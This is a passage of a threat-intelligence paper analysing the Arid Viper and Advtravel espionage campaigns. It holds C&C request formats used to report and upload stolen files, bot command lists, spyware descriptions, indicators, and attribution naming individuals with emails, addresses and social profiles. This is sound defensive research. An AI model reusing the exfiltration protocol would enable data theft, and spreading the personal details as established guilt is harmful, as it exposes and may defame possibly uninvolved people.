This keeps the path and name of the .EXE \nfile dropped into the registry key. It also copies itself into \n%SystemDrive%\\Program Files\\Messenger via a hard-coded \npath. In addition to using \u201cSkype\u201d in the registry, the malware \nalso frequently spoofed the Skype icon. All of the malware \nsamples seen had portable executable (PE) file sections \nwritten in Arabic.\n\nThe malware logs in to the C&C console by calling a very \nspecific PHP script on the C&C server\u2014/products/add_user.ph\np?name=VMwareVirtualIDEHardDrive\u20141268730784&user=38. \nThe number it creates for the user parameter\u201438 in the \nexample\u2014was chosen from the malware client to identify \nthe session. It then starts searching the whole hard disk for \ndocuments\u2014.DOC, .XLS, .PPT, and .TXT files. Each document \nfound is reported to the C&C server using the format, GET /\nproducts/file_order3.php?name=VMwareVirtualIDEHardDri\nve\u20141268730784&path=C:/Documents%20and%20Settings/\nuser/Templates/winword.doc.\n3 | Page \n\nThe Wireshark log (top) shows the files \nthe malware sends to a C&C server. \nThe assembly code section (bottom) \nsearches for .XLS files to steal.\n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fThe C&C server immediately responds if each document is interesting or not. This \ndecision probably comes from a hard-coded black list on the server side to likely \nprevent the client from sending out default templates and generic readme.txt files. \nThe server also tries to avoid requesting for duplicates of files it already has in further \nstealing sessions. It has two possible responses:\n\n\u2022  Response for an interesting document:\n\nHTTP/1.1 200 OK\nDate: Thu, 02 Oct 2014 14:49:45 GMT\nServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips mod_\nbwlimited/1.4\nX-Powered-By: PHP/5.5.16\nTransfer-Encoding: chunked\nContent-Type: text/html\n4\n6\ndone\n0\n\n\u2022  Response for an uninteresting document:\n\nHTTP/1.1 200 OK\nDate: Thu, 02 Oct 2014 14:49:23 GMT\nServer: Apache/2.4.10 (Unix) OpenSSL/1.0.1e-fips mod_\nbwlimited/1.4\nX-Powered-By: PHP/5.5.16\nTransfer-Encoding: chunked\nContent-Type: text/html\n2\n2\n\nThe client then proceeds to list down all of the interesting documents to steal. These \nare compressed in a 0.txt file and uploaded to a C&C server via a POST request such \nas POST /products/fupdates.php. This request comprises a single POST parameter \nformatted as a GET parameter such as account=38&name=VMwareVirtualIDEHardD\nrive\u20141268730784&folder=tree&fname=02-10-2014 10-50.rml&s=<base64-file>.\n\nThe server presumably uses the account value, which is the same as the previously \nmentioned user value, to track sessions where particular files are uploaded. The \nfname parameter is the .ZIP file\u2019s name and contains a specific date and time. The \n0.txt file is deleted after the upload.\n\nAt the end of the file upload, the client issues the request, /products/all_file_info1.ph\np?name=VMwareVirtualIDEHardDrive\u20141268730784&user=38&file=02-10-2014%20\n10-50.rml&type=tree, to make sure everything went smoothly.\n\nAs shown, a single execution allows the malware client to steal documents from \ninfected systems. After carrying out all of its routines, the malware routinely checks \nback with the C&C server to see if it should continue running using the path,  \n/products/get_statu.php?name=VMwareVirtualIDEHardDrive\u20141268730784. A \nresponse containing run11 tells it to continue running whereas stop disables it to \npossibly avoid infecting uninteresting systems.\n\n4 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fC&C Infrastructure\n\nUsing an initial malware sample and its corresponding C&C server, \nwe looked through internal Trend Micro databases to compile a list of \nsimilar malware that contact the same server. All cases revealed that the \nmalware essentially exhibited the same behaviors previously outlined.\n\nThe first C&C server found was pstcmedia.com. A quick search \nrevealed that another site\u2014mixedwork.com\u2014hosted on the same IP \naddress\u2014188.40.81.136\u2014also acted as a C&C server. Although the \npstcmedia.com site changed IP addresses, mixedwork.com seemed to \nstay on this IP address. The other IP addresses pstcmedia.com used \ninclude 192.254.132.26 and 54.255.143.112. The second IP address has \nbeen sink-holed by other security researchers.\n\nTo find other domains that may be part of the same campaign or used by \nthe same perpetrators, an investigation of domain registration data was \nconducted. The C&C server that pstcmedia.com used was registered \nusing the personal email address, khalid.samraa@gmail.com.

But it does bear \ncertain similarities to Operation Arid Viper that we believe merits its addition to this \npaper. The cybercriminals behind this campaign may have some ties with the threat \nactors behind Operation Arid Viper, which include:\n\n\u2022  They shared servers for command and control.\n\n\u2022  They used the same email addresses to register their domains\u2014advtravel.\n\ninfo, fpupdate.info, and linksis.info.\n\n\u2022  Their perpetrators had ties to the Gaza Strip.\n\nC&C Infrastructure\n\nWhile conducting our investigation, we came across an Advtravel C&C \nserver that shared the same infrastructure with Operation Arid Viper. \nIt is particularly interesting to note that the advtravel.info site left its \nserver\u2019s root directory structure completely open to the public. This, \ncombined with some other cybercriminal activities elaborated in the \nattribution section, led us to believe that the Advtravel attackers were \nless-skilled than those behind Operation Arid Viper.\n\nAn analysis of December 2014 data shows that Advtravel\u2019s C&C server \ndirectory could be publicly accessed. This allowed us to download copies  \nof its entire content to study as part of our investigation before its owners  \nrealized their mistake and locked it down. Earlier versions of data from  \nSeptember 2014 were also downloaded.\n\nPublicly accessible Advtravel \nsite root directory\n\nThe advtravel.info directory had several files and folders. Although we were not able \nto exhaustively analyze every file on it, details on its most interesting components are \nhighlighted below:\n\n\u2022  B1312.zip: This is a 1.4GB compressed backup of all of the other files on the \nC&C server. Leaving this file on the server allowed us to look inside the code \nof the .PHP files the attackers used.\n\n\u2022 \n\n/apps/: This main directory contains stolen victim data, along with several \nPHP scripts that uploaded it to the server. It used the format, /apps/A[3 \nnums]X/[COMPUTERNAME_USERNAME] where A[3 nums]X represents a \nparticular subcampaign while /[COMPUTERNAME_USERNAME] identifies a \nunique victim. The three digits in the folder format seem to indicate the month \nof the year, as they ranged from 001 to 012. Further analysis of the dates \nwhen the data was stolen, however, disproved that theory.\n\nAn exhaustive analysis of every file on the server is beyond the scope of this \npaper but the details of the most interesting components are:\n\n9 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\f \u0083\n\n \u0083\n\n/apps/A[3 nums]X/ison.on: This refers to \nthe last time stolen data was uploaded in \nthe format, dd-mm-yyyy-hh-mm-ss.\n\n/apps/A[3 nums]X/data/: This contains \nscreenshots taken from infected systems, \nalong with the following files, the presence \nof which varied from victim to victim:\n\n \u008a allips.txt: Contains victims\u2019 local and \n\nexternal IP addresses.\n\n \u008a CurrentProcess.txt: List of running \nprocesses on infected systems.\n\n \u008a cmpinf.txt: Contains the infection \ndate, OS, user domain name, and \nusername.\n\n \u008a downinf.txt: Contains the infection date, \nOS, user domain name, username, \nand status such as \u201cDownload \nComplete :).\u201d\n\n \u008a DrivesList.txt: List of all of an infected \n\nsystem\u2019s drives.\n\nshown in the table below.\n\n \u008a FileList.txt: List of files in a directory \non an infected system, frequently \nwhere the malware was executed.\n\n \u008a pdata.txt: List of stolen website login \n\ncredentials.\n\n \u008a webrowser.txt: List of stolen web \n\nbrowser credentials.\n\n \u008a wifi.txt: List of stolen Wi-Fi connection \n\ncredentials.\n\n \u008a workdata.txt: Contains the infection \n\ndate, OS, user domain name, \nusername, and a line labeled APP_\nPATH=, which indicates which directory \nthe malware was installed on.\n\n \u008a Winkey.log: Log of victims\u2019 keystrokes.\n\n \u008a Other files that the attacker manually \nordered his malware to directly \nsteal from the victim.

From \n2007 to 2012 though, it was registered to:\n\nRegistrant Name:Adv Travels\nRegistrant Organization:Adv Travels\nRegistrant Street1:4401 Bayou Boulevard\nRegistrant Street2:\nRegistrant Street3:\nRegistrant City:Pensacola\nRegistrant State/Province:Florida\nRegistrant Postal Code:32503\nRegistrant Country:US\nRegistrant Phone:+01804777777\nRegistrant Phone Ext.:\nRegistrant FAX:\nRegistrant FAX Ext.:\nRegistrant Email:renold.dave@advtravel.info\n\nMalware\n\nAn analysis of the stolen files and logs allowed us to come up with a brief description \nof the initial Advtravel malware. In general, it only serves to respond to a C&C server. \nThe attackers then manually downloaded other tools onto infected systems to extract \nvictim credentials.\n\n13 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fAfter the initial dropper or download chain, the malware starts its \ndata-stealing routine. It calls home to a C&C server and report each \nfolder found on the infected system. The server then replies with a \nconfirmation on whether or not the malware should send the folders\u2019 \ncontents.\n\nThe Advtravel and Operation Arid Viper malware had similar behaviors. \nThis may or may not be a coincidence, as their binaries significantly \ndiffered. The Advtravel malware was coded in C# so the dropper needs \nto go through additional steps to build and update a .NET-running \nenvironment where it can be executed. This involves downloads and \nMicrosoft\u2122 software installations, which not only caused significant \ninfection delays but also served as an additional point of failure to \nexecute.\n\nThe following are some sample HTTP requests seen in Operation \nAdvtravel:\n\n\u2022  GET/sys/who.php?t=2/8/2015%205:30:59%20AM HTTP/1.1: \n\nFirst-time login.\n\n\u2022  GET/sys/genid.php?t=2/8/2015%205:31:00%20AM: Asks to  \ngenerate a unique ID for a particular first-time client. The ID  \nreturned in this example was 2aMUu7TcPbUBsHVLNogB.vic,  \nwhich will be used by the bot client throughout.\n\nPossible Advtravel malware \ninfection chain\n\n\u2022  POST/sys/upload.php?dirname=//2aMUu7TcPbUBsHVLNogB.vic&x=old: \n\nSend directory name information.\n\n\u2022  GET/sys/data//2aMUu7TcPbUBsHVLNogB.vic/command.\n\ncmd?t=2/8/2015%205:31:02%20AM: Get a command from the server.\n\nIn one particular example, the initial malware was a self-extracting .CAB file that \neventually downloaded the main malware and patver.tmp, which contains the value, \nA012X. This value indicates the server folder where the stolen data should be \nuploaded to. This is essentially a campaign identifier. The malware then dropped \na .JPG file showing the famous Dome of the Rock Church in Jerusalem. It also \nexhibited the following behaviors:\n\n\u2022 \n\nInstalls itself to a default location such as C:\\Users\\[USER]\\AppData\\Roaming\\\nAdobeAPP or C:\\Documents and Settings\\[USER]\\Application Data\\explr\n\n\u2022  Puts logs and support files in C:\\Users\\[USER]\\AppData\\Roaming\\AdobeAPP\\\n\ntemp (Note that the .EXE file varies and appears to be downloaded on \ndemand.)\n\n\u2022  Uses many of the support files previously described in another section, which \n\nare found in the \\temp folder\n\n\u2022  Can send commands such as the following to bots:\n\n \u0083 get_scrshot: Get a screenshot.\n\n \u0083 get_workdata: Returns an infected system\u2019s local time, OS, user domain \n\n14 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\f \u0083\n\n \u0083\n\nname, username, and malware path.\n\nexplore_dir*[FULL PATH TO DIR]: \nGets a directory listing.\n\nrun_file*[FILE TO RUN]: Executes a \nfile.\n\n \u0083 get_file*[FILE TO GET]: Retrieves a \n\nvictim\u2019s file.\n\n \u0083 get_procslist: Gets a process or task \n\nlist.\n\n \u0083\n\nkill_prcs*[PID]: Kills a process.\n\n \u0083 get_driveslist: Lists all of an infected \n\nsystem\u2019s mounted drives.\n\n \u0083\n\n=FILE=: Allows attackers to upload \nnew files to a victim\u2019s system.\n\n \u0083 download*[URL]: Downloads a file \nfrom a URL onto an infected system.\n\n \u0083 del_path*[FILE]: Deletes a file or \n\nfolder.\n\n\u2022  Communicates with the advtravel.info/\napps/ directory to listen for commands \nand uploads stolen data to the /\ndel directory. The log lists down an \ninfected system\u2019s current directory, runs \na password stealer, retrieves stolen \ncredentials, and takes screenshots.\n\nBased on patlogs, at least four botnet  \nadministrators\u2014khloda@dhs, belal@dhs,  \nbelal2@dhs, and admin@dhs\u2014log in to the  \nserver and control the bots through the  \nadministration panel\u2014a tool called DHDSM.\n\nVictims\n\nLog of the activities an Advtravel malware variant \nperforms on infected systems\n\nThe Advtravel server has more than 500 infected systems. All of the stolen details \nfound on it have been backed up for evidence. Most of the data have been analyzed \nto get an idea as to who have been victimized by the campaign. Some observations \nmade include:\n\n\u2022  The majority of victims appeared to be Arabs from Egypt.\n\n\u2022  All of the infected systems appeared to be personal laptops, judging by the \n\npresence of a battery indicator in screenshots. This led us to believe that the \ncampaign was not as sophisticated or as targeted as Operation Arid Viper.\n\n15 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\f\u2022  The attackers appear to be keenly interested in images stored on victims\u2019 \nsystems. This could be a sign that they are looking for incriminating or \ncompromising images for blackmail purposes. As such, the attackers may be \nless-skilled hackers who are not after financial gain nor hacking for espionage \npurposes.\n\n\u2022  A lot of the screenshots unusually showed open Facebook profiles. The \n\nvictims either spent a lot of time on Facebook every day or the malware took \nscreenshots every time a victim accessed the site. This allowed the attackers \nto identify their victims. More details on this will be revealed after further \ninvestigation.\n\nfpupdate.info Server\n\nThe fpupdate.info server\u2019s main directory contains a /mobile/ folder. \nAt the time of writing, the site no longer allowed public access to \nthe server\u2019s files although we were able to back them up back in \nSeptember 2014.\n\nAt present, all of the related .PHP files cannot access the server\u2019s \nback-end database, which could mean it is down or unmaintained. An \nuploads folder had two subfolders that contained personal information \nstolen from victims\u2019 mobile phones. Each subfolder had another two \nsubfolders\u2014/calllog and /sms. We were, however, unable to obtain a \ncopy of the Android\u2122 malware the attackers may have used to create \nthe logs.\n\nVICTIMS\n\nfpupdate.info main directory\n\nThe fpupdate.info server contained phone data stolen from two victims,  \nnamely:\n\nVictim data stored on \nfpupdate.info\n\n\u2022  LGE_IMEI: The device\u2019s International Mobile Station Equipment Identity \n(IMEI) number revealed that it was an LG D821 Nexus 5 phone owned \nby someone from Israel. Call logs containing several Israel-based phone \nnumbers, some of which had corresponding contact names, were found on \nthe server. One particular contact called My Number belonged to someone \nfrom Palestine.\n\n\u2022  SAMSUNG_IMEI: This device\u2019s IMEI number revealed that it was a Samsung \nP5100 Galaxy Tab 2 10.1 owned by someone from Israel. Logs indicating \ncalls made to several Israel-based phone numbers were found, along with \nSMS logs. Most of the text messages were tweets by @shadipal2 and  \n@Alaqsavoice_Brk, users who relayed real-time news about Gaza. The other \ntext messages, meanwhile, revealed meetings in places in Tunisia such as \nGafsa and Sakiet Eddaier.\n\n16 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fLINKSIS.INFO SERVER\n\nIn addition to the two previously mentioned servers, linksis.info has also been found \nto have a very similar open directory layout to advtravel.info. It also used a lot of the \nsame malware. We have not completely explored this server though a quick look \nclearly revealed ties to advtravel.info, including:\n\n\u2022 \n\n\u2022 \n\n\u2022 \n\n\u2022 \n\nIt is hosted on the same IP address\u2014188.40.106.84\u2014located in Hetzner, \nGermany.\n\nIts DNS SOA record used the email address, mahmoud.hashem12@gmail.\ncom.\n\nIt has an http://www.linksis.info/sys/del/belal/ folder, which is owned by one of \nthe users of advtravel.info\u2019s C&C control panels.\n\nIt contains the same log files\u2014webbrowser.txt and so on\u2014although these \nwere encrypted.\n\nATTRIBUTION\n\nThe individuals identified in this section have some apparent connection with \nOperation Arid Viper or Advtravel. Trend Micro would, however, like to point out \nthat they may or may not be involved with cybercrime. We simply intend to lay out \nverified facts that link them to the campaigns\u2019 infrastructure and malware. Several \nother reasons such as having their email accounts stolen and used to register C&C \nservers, deliberate impersonation, and the like could also account for their links to the \ncampaigns.\n\nKhalid Samra\n\nSome of the C&C server domain \nnames were registered by a \nsupposed Khalid Samra from \nPalestine. His social networking \naccount email addresses were used \nto register several Operation Arid \nViper C&C servers based on Whois \nregistration data.\n\nAn email address incorporating \nSamra\u2019s name\u2014khalid.samraa@\ngmail.com\u2014was used to register the \npstcmedia.com C&C server based \non DNS SOA records. Further  \nOSINT investigation revealed ties to  \nother similar email addresses\u2014khalid. \n\nKhalid Samra\u2019s profile also mentions that he was based in \nPalestine.\n\n17 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fSamra\u2019s two Facebook accounts with matching profiles and images\n\nTwo Facebook pages Samra has ties to\n\nsamraa@gmail.com, khalid.samraa@hotmail.com, khalid.samraa@wwb.ps, and \nkhalid.samraa@coreions.com.\n\nTo get a better idea as to what sort of person Samra is and to determine if he may \nhave a motive for taking part in the campaigns, we took a look at his other social \nnetworking accounts. He apparently has two Facebook accounts\u2014https://www.\nfacebook.com/khaled.a.samraa and https://www.facebook.com/khalid.k.abusamra. \nThe email address for the first account was used to register one of Operation Arid \nViper\u2019s C&C servers. The publicly visible profile pictures also suggest that he owned \nall three accounts. The accounts indicate that he lives in Gaza and that he has pro-\nPalestine and anti-Israeli political beliefs.\n\n18 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fWhat appears to be Samra\u2019s second Facebook account also indicates \nthat he is from Gaza. It also mentions where he worked, Coreions, \nlike his LinkedIn profile. Unlike the first account though, this has more \nties to several members of his family. Photographs posted on it also \nclearly show his presence in Gaza in 2012. A further Facebook search \nfor the email address, khalid.samraa@gmail.com, also pointed to a \ngroup page called \u201cGazaUnderFire2012\u201d (https://www.facebook.com/\nGazaUnderFire2014), which Samra apparently set up back in 2012. This \npage then led to a newer group page called \u201cGaza Under Attack 2014\u201d \n(https://www.facebook.com/gazaunderattack2014). Both of the pages \nprovide updates on the ongoing Palestine-Israel conflict with a very \nstrong pro-Palestine/-Hamas and anti-Israeli focus, just like the personal \nSamra Facebook accounts.\n\nApart from the Facebook accounts, Samra had other social networking \naccounts such as in Twitter (https://twitter.com/KhalidSamraa), Google+ \n(https://plus.google.com/113430785728528060894/ and https://plus.\ngoogle.com/117379342774799926526/), and MySpace (http://myspace.\ncom/225923317).\n\nOn 4 November 2011, Coreions\u2019 Whois record again changed. Although \nall of the major details remained the same, the email address was \nchanged to khalid.samraa@gmail.com. On 13 January 2012, its entire \nregistration details changed to the following:\n\nkhalid abu samra ()\nGaza- Al Rimal- Al Wihda Street, Opposite to Al-Amal \ninstitu\nAl-Nakheel commercial mall, 1st floor\nGaza, ISRAEL 00972\nIL\n\nAhmed Jmal\n\nThe email address, ahmed.jmal1989@gmail.com, was used to register \ntwo of Operation Arid Viper\u2019s C&C servers\u2014mixedwork.com and \nplmedgroup.com. It also has ties to the Facebook account, https://www.\nfacebook.com/ahmed.jmal.00. The Ahmed Jmal Facebook account \nindicates that he resides in Marrakesh, Morocco.\n\nMahmoud Hashem\n\nThe email address, mahmoud.hashem12@gmail.com, was used to \nregister two Operation Arid Viper C&C servers\u2014mediahitech.info and \nahmedfaiez.info\u2014and one of the Advtravel C&C domains\u2014fpupdate.\ninfo. Ahmedfaiez.com and fpupdate.info also has ties to the email \naddress, moh.s009@gmail.com. This fact shows a relationship between \n\n19 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fthe two campaigns even if they \nused unrelated binaries. They did \nhave some commonalities such \nas sharing a common network \ninfrastructure.\n\nMoh.s009@gmail.com was also \nused to register six of the C&C \nservers\u2014ahmedfaiez.info, fpupdate.\ninfo, ineltdriver.com, flushupdate.\ncom, flushupate.com, and advtravel.\ninfo\u2014related to the two campaigns. \nIt was also found in DNS SOA \nrecords for linkedim.in, iwork-sys.\ncom, nauss-lab.com, nice-mobiles.\ncom, and abuhmaid.net.\n\nThe site, linkedim.in, was \nparticularly registered using the \nfollowing details:\n\nAhmed Jmal\u2019s email address was used to register two of \nOperation Arid Viper\u2019s C&C servers.\n\nRegistrant Name:Mahmoud Hashem\nRegistrant Organization:blogging \nhoster\nRegistrant Street1:omar mokhtar\nRegistrant City:gaza\nRegistrant State/Province:gaza strip\nRegistrant Postal Code:00972\nRegistrant Country:IL\nRegistrant Phone:+972546587385\nRegistrant Email:blogging.host@live.com\n\nThe registration details above ties the two email addresses\u2014mahmoud.hashem12@\ngmail.com and moh.s009@gmail.com\u2014together. We believe they belong to the same \nperson though we have yet to find a real person behind the profiles.\n\nDev_hima\n\nAs previously mentioned, several advtravel.info infection logs can be clearly \nlinked to Operation Advtravel\u2019s malware developers or bot masters. It is also worth \nremembering that the malware used in Operations Advtravel and Operation Arid \nViper distinctly differed from each other though they shared a common network \ninfrastructure. The logs showed that the infection started from the same folder \nVisual Studio\u00ae drops a compiled file into and that screenshots showed other \nmalware present on advtravel.info. This shows that advtravel.info is a development \nenvironment and could very likely be where the malware are programmed. The \nserver\u2019s username is Dev_hima. A close look at other log files allowed us to find at \nleast three other systems with the same user. Some of the samples gathered from \nthe Trend Micro sample database listed down Dev_hima as an internal author as \nwell.\n\n20 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fThe bot logs from Dev_hima look \nlike logs from test environments \nwith different virtual machines that \nbelonged to the original developer \nwho performed some debugging \nand testing. This mistake went \neven further, as while testing the \nmalware, it took several screenshots \nof Dev_hima\u2019s system, which gave \nus some insight into his operations. \nThe CPanel display in a Windows 8 \nenvironment showed how he went \nthrough victim logs. Other tabs open \nin the same browser display his \nFacebook profile page.\n\nThe control panel is a Windows tool  \ncalled \u201cDHSDM.\u201d Its icon can also \nbe seen as the rightmost program \non the taskbar. This can be found \non several of Dev_hima\u2019s test virtual \nmachines. It also showed that Dev_\nhima corresponded to the Admin \nuser of the control panel. Other \ndetails recovered from logs revealed \nan IP address geolocated in Cairo, \nEgypt.\n\nAnother clue to Dev_hima\u2019s relation \nto the Advtravel malware was a \nworking downloader from December \n2014 that is related to advtravel.\ninfo. It downloaded a malware from \na server that is then run on infected \nsystems. The PE header data of \nthis downloader again showed the \nname, Dev_hima as application  \npublisher. Nveron appears to be Dev_ \nhima\u2019s filename for the malware.\n\nScreenshot of Dev_hima\u2019s system stored on advtravel.info\n\nInformation on a malware variant published by Dev_hima\n\nA web search for developers with the nickname, Dev_hima, turned up one profile that \nfit what we know so far very well. Dev_hima was not exactly hiding online. He actually \nhad various online accounts\u2014http://devhima.blogspot.com/p/blog-page.html, http://\ndevhima.webs.com/about, youtube.com/user/ibrahhm2121/, facebook.com/devhima, \ntwitter.com/dev_hima, linkedin.com/pub/ebrahim-elsharawy/69/324/7b5, scribd.com/\ndevhima, soundcloud.com/ebrahim-elsharawy, and devhima.tumblr.com\u2014that tie his \nreal identity to his nickname.\n\n21 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fDev_hima can also be tied to the \nSkype ID, ibrahhm2121, along \nwith the email addresses, dev_\nhima@yahoo.com, devhima@\nhotmail.com, ibrahhm2121@\ngmail.com, ibrahhm212@gmail.\ncom, and ibrahhm2121@yahoo.\ncom. Of course, it is conceivable \nthat a malicious hacker sought to \nappropriate El Sharawy\u2019s identity \nor coincidentally chose the same \nnickname.\n\nA look at malicious activities tied to \nthe nickname, Dev_hima, revealed \nvery interesting things. We found \nthat Dev_hima was part of the \n\u201cGaza Hacker Team,\u201d a group \ninvolved in multiple website hacking \nand defacement incidents against \nIsraeli targets in the past. A few of \nthe more than 2,000 defacement \nattacks the team carried out \ninvolved sites in Israel.\n\nSome of Dev_hima\u2019s social networking profiles\n\nSome of Dev_hima\u2019s hacker group \nprofiles can also be found on gaza-\nhacker.org/cc/member-u_42271.\nhtml and arabteam2000-forum.com/\nindex.php/user/272853-dev-hima/. \nHis personal project page\u2014http://\ndevhima.webs.com/\u2014showed  \nseveral potentially malicious tools  \nthat he has coded. DevPcTwitter, for  \ninstance, allows attackers to control a  \ntarget system using a Twitter account. DevSpy, meanwhile, allows parents to monitor \ntheir children\u2019s online communication and browsing habits for protection purposes. In \nreality though, DevSpy is simply a piece of spyware.\n\nDev_hima also has ties to several email addresses and online \naccounts\n\nDevPcTwitter (MD5: bfcb492d282960152a366b5760b87920d02c6e83) is publicly \navailable for download on Dev_hima\u2019s site.\n\nThe structure of the last four DevPcTwitter commands\u2014getfile*[file_path]\u2014is \ninteresting. The commands had a similar though not identical syntax to the format \nDev_hima\u2019s bot used to communicate with advtravel.info.\n\nDev_hima shared tutorial videos on YouTube on how to configure and use \nDevPcTwitter. These videos were linked to his personal page. His Twitter bot\u2019s \nfunction is simple. It lets a user register a Twitter account and an email address in the \n\n22 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fList of website attacks that Dev_hima\u2019s hacker group was involved with\n\nDevPcTwitter program. The user \ncan then start tweeting commands \nvia the account registered, which the \nbot reads and executes. Commands \nsuch as GetScreenShot tells \nDevPcTwitter to take screenshots of \na victim\u2019s desktop that it then emails \nto the email address registered. The \nbot can also download and execute \nfiles using the Download$[URL] \ncommand.\n\nDevPcTwitter\u2019s UI shows it was designed for Arabic-speaking \nusers.\n\nDevPcTwitter is low-risk because it  \nrequires a lot of user interaction to set up and operate. Its bot does not have the \nfunctionality to stealthily run in the background as well.\n\nDev_hima also developed the spying tool, DevSpy. Its installer (MD5: \n\n23 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fTools available for public download on Dev_hima\u2019s website\n\nd325c541fa0f3080a25394fe3a586100910f5569) \nis also available for public download from http://\ndevhima.webs.com/. Unlike DevPcTwitter, the \nDevSpy interface uses English, not Arabic. Its \nsetup is also pretty self-explanatory. It takes \ndesktop screenshots at user-specified intervals \nthat it then stores in a folder. It can stealthily run \nin the background. In stealth mode though, it can \nbe only be accessed by pressing a hotkey that \nrequires password authentication. In the same \nmode, DevSpy can remove itself from a victim\u2019s \nWindows Task Manager process list.\n\nDevSpy is medium- to high-risk because it is \ndesigned to spy on users in stealth mode. It is \npossible or even likely that the malware used to \ncommunicate with advtravel.info is a privately \nenhanced version of Dev_hima\u2019s  \ntools.\n\nVIRUS_HIMA\n\nDev_hima used the handles, hima, virusxhima \nand ViRuS_HiMa, with the email address, \nvirusxhima@gmail.com, though there was not \nenough evidence to confirm that Dev_hima and \nViRuS_HiMa are the same person.\n\nViRuS_HiMa had ties to several high-profile \nhacking attacks, including:\n\n\u2022  The theft of 150,000 passwords from \nAdobe employees, customers, and \npartners such as the U.S. Military, USAF, \nGoogle, NASA, and DHL [5]\n\nDevPcTwitter supports an extensive array of \nexecutable commands.\n\n24 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\f\u2022  The cross-site scripting \n\n(XSS) attack on 2shared.\ncom [6]\n\n\u2022  More than 1,700 website \ndefacement incidents\n\n\u2022  The Yahoo SQL attack \n\nclaimed to have been by \nperpetrators from Egypt \n[7]\n\nSome emails with ties to ViRuS_\nHiMa include virusxhima@gmail.\ncom, egypt_government@hotmail. \ncom, a.e@hotmail.com, and ana. \nmsre@hotmail.com.\n\nMohammed Khaled\n\nDevSpy\u2019s UI and setup console\n\nAs previously mentioned, one advtravel.info file\u2014Mkhaled.txt\u2014had the \nlink, https://www.facebook.com/messages/LODALODALODA. When \nclicked, a Facebook message was sent to a Mohamed Khaled profile \npage (https://www.facebook.com/LODALODALODA) as notification of \nnew successful system infections. The profile indicates that Khaled lives \nin Cairo, Egypt.\n\nInterestingly, a Mohamed Khaled can be further connected to Dev_\nhima. On a page promoting Dev_hima\u2019s DevPcTwitter tool, we saw one \ncomment from a Mohamed Khaled regarding the remote access tool  \n(RAT).\n\nFathy Mostafa\n\n.TXT file snippet from http://\nwww/hackerbox.net/upload.\ntxt showing a relationship \nbetween Dev_hima and \nViRuS_HiMa\n\nFathy Mostafa is another individual with apparent connections to Operation Advtravel. \nIn one of the advtravel.info logs, we saw a screenshot of the main Advtravel malware \nunder development.\n\nThe code showed testing URLs that used the same paths as the actual malware that \naccessed the advtravel.info domain. The username, fathy, can clearly be seen. Other \nlogs from the same infection gave us some stolen account details, including:\n\n\u2022  http://members.000webhost.com/login.php was registered using \n\nismaelalaa32@gmail.com and fathymostafa9@gmail.com\n\n\u2022  https://khamsat.com/register, https://www.freelancer.com/, and https://www.\n\nlinkedin.com/uas/login used fathymostafa9@gmail.com\n\nMostafa\u2019s\u2019s skills, according to work profile sites, include C# programming, which was \ncoincidentally used to program the Advtravel malware.\n\n25 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fMohammed Khaled\u2019s Facebook profile and picture\n\nThe email address, fathymostafa9@\ngmail.com, was also associated with \nthe Facebook account, https://www.\nfacebook.com/fathy.mostafa.1690. \nThe profile indicates that Mostafa \nlives in Egypt, like many others \ntied to Operation Advtravel. He \nstudied Electronic Engineering and \nis a member of several Facebook \ngroups, including two that were  \nrelated to the Muslim Brotherhood. \n[8]\n\nOther Individuals\n\nIn addition to the previously \nmentioned individuals, other \nnicknames associated with \nOperation Advtravel have been \nfound as well. We saw three other \naccount names\u2014khodla, belal, and \nbelal2\u2014on the Advtravel control \npanel.\n\nKhaled commenting on Dev_hima\u2019s RAT\n\nThe systems that belal owned had \nparticular ties to Operation Advtravel \ndue to their use of the word \u201cRoo0T\u201d  \nor \u201cRo0t\u201d in usernames. His systems  \nall had the main malware control  \npanel, along with games such as \u201cCounter Strike Global Offensive.\u201d He also had \nfolders containing the njrat7 malware\u2014a popular RAT in Arabic countries, as it was \n\nAdvtravel.info log showing the malware code while it was being \ndeveloped\n\n26 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\flocally developed and supported. Belal\u2019s folders also contained a .TXT file named Israil mails.txt, which had \n2,572 email addresses, possibly for attack purposes.\n\nMostafa\u2019s Facebook profile\n\nBelal logged in to the Advtravel control panel\n\n27 | Page \n\n\u00a9 2015 Trend Micro Incorporated\n\nOperation Arid Viper Research Paper\fCONCLUSION\n\nThe malware campaigns\u2014Operation Arid Viper \nand Advtravel\u2014discussed in detail in this paper are \nseparate but closely linked. Operation Arid Viper \ntargets specific Israeli organizations, including some \nhigh-profile victims, using a network infrastructure \nin Germany with several strong ties to Gaza in \nPalestine.\n\nAdvtravel, meanwhile, has more connections\u2014\npossible culprits and victims alike\u2014to Egypt. \nHowever, based on IP address logins, we again saw \nconnections to the Gaza Strip.\n\nWhile the two campaigns shared infrastructure, \ntheir tactics could not be further apart. Operation \nArid Viper is a sophisticated campaign targeting \nkey individuals in organizations in order to exfiltrate \nsensitive data. Its C&C servers were, in fact, closely \nlocked down, providing very little hint that could aid \nour investigation.\n\nAdvtravel, on the other hand, looks very much like the \nwork of less-skilled cybercriminals who appeared to \nbe motivated neither by financial gain nor conducting \nespionage. Instead, they look like a classic group of \nbeginner hackers just starting their careers.\n\nYet it remains 